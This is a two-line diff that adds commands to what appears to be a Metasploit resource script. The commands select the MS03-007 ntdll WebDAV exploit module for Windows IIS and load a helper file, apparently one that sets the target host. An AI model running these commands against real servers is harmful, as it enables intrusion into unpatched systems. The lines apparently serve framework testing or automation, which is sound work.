@@ -1,0 +1,2 @@
+use exploits/windows/iis/ms03_007_ntdll_webdav
+resource stub_http_explt_rhost.rb
